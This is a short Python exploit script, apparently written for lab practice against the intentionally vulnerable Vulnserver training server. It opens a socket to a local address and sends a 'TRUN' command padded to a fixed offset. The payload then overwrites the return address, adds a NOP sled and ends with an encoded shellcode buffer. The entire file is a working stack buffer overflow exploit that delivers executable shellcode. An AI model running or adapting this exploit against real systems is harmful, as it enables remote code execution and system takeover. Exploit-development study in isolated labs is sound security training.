
#!/usr/bin/env python3

# importation : 
import socket
import struct

# code :
s = socket.socket()
s.connect( ("192.168.1.6",9999) )
offset = 2003
total_length = 2984
new_eip = struct.pack("<I", 0x62501205)


buf =  b""
buf += b"\xb8\xf4\x96\x41\x1b\xda\xc9\xd9\x74\x24\xf4\x5d\x29"
buf += b"\xc9\xb1\x59\x31\x45\x14\x03\x45\x14\x83\xc5\x04\x16"
buf += b"\x63\xbd\xf3\x59\x8c\x3e\x04\x05\x04\xdb\x35\x17\x72"
buf += b"\xaf\x64\xa7\xf0\xfd\x84\x4c\x54\x16\x9a\xe5\x13\x30"
buf += b"\x2f\x7b\x8c\x0d\xd0\x4a\x0c\xc1\x12\xcd\xf0\x18\x47"
buf += b"\x2d\xc8\xd2\x9a\x2c\x0d\xa5\xd1\xc1\xc3\xbd\x48\x0d"
buf += b"\x6f\x83\x50\x2c\xbf\x53\x22\x6e\x47\xd9\xf4\x1a\xfb"
buf += b"\xe0\x24\x69\x5b\xc3\x94\xe6\x14\x1b\x14\x2b\x21\xd2"
buf += b"\x62\xf7\x1b\x1a\xc3\x8c\x68\x6f\xd5\x44\xa1\xaf\x17"
buf += b"\xa7\xcf\x83\x99\xf0\xe8\x3b\xec\x0a\x0b\xc1\xf7\xc9"
buf += b"\x71\x1d\x7d\xcd\xd2\xd6\x25\x29\xe2\x3b\xb3\xba\xe8"
buf += b"\xf0\xb7\xe4\xec\x07\x1b\x9f\x09\x83\x9a\x4f\x98\xd7"
buf += b"\xb8\x4b\xc0\x8c\xa1\xca\xac\x63\xdd\x0c\x08\xdb\x7b"
buf += b"\x47\xbb\x0a\xfb\xa8\x43\x33\xa1\x3e\x8f\xfe\x5a\xbe"
buf += b"\x87\x89\x29\x8c\x08\x22\xa6\xbc\xc1\xec\x31\xb5\xc6"
buf += b"\x0e\xed\x7d\x86\xf0\x0e\x7d\x8e\x36\x5a\x2d\xb8\x9f"
buf += b"\xe3\xa6\x38\x1f\x36\x52\x33\xb7\x79\x0a\x42\x4e\x12"
buf += b"\x48\x45\x41\xbe\xc5\xa3\x31\x6e\x85\x7b\xf2\xde\x65"
buf += b"\x2c\x9a\x34\x6a\x13\xba\x36\xa1\x3c\x51\xd9\x1f\x14"
buf += b"\xce\x40\x3a\xee\x6f\x8c\x91\x8a\xb0\x06\x13\x6a\x7e"
buf += b"\xef\x56\x78\x97\x88\x98\x80\x68\x3d\x98\xea\x6c\x97"
buf += b"\xcf\x82\x6e\xce\x27\x0d\x90\x25\x34\x4a\x6e\xb8\x0c"
buf += b"\x20\x59\x2e\x30\x5e\xa6\xbe\xb0\x9e\xf0\xd4\xb0\xf6"
buf += b"\xa4\x8c\xe3\xe3\xaa\x18\x90\xbf\x3e\xa3\xc0\x6c\xe8"
buf += b"\xcb\xee\x4b\xde\x53\x11\xbe\x5c\x93\xed\x3c\x4b\x3c"
buf += b"\x85\xbe\xcb\xbc\x55\xd5\xcb\xec\x3d\x22\xe3\x03\x8d"
buf += b"\xcb\x2e\x4c\x85\x46\xbf\x3e\x34\x56\xea\x9f\xe8\x57"
buf += b"\x19\x04\x1b\x2d\x52\xbb\xdc\xd2\x7a\xd8\xdd\xd2\x82"
buf += b"\xde\xe2\x04\xbb\x94\x25\x95\xf8\xa7\x10\xb8\xa9\x2d"
buf += b"\x5a\xee\xaa\x67"



shellcode = buf

all_chars = b"".join([struct.pack("B",x) for x in range(1,256)])

nop = b"\x90" * 16

payload = [
        b"TRUN /.:/",
        b"A" * offset,
        new_eip,
        nop,
        shellcode,
        b"C"*(total_length - offset - len(new_eip)- len(nop) - len(shellcode) )           
]

payload = b"".join(payload)

s.send(payload)

s.close()

# total length = 2984
# offset = 2003

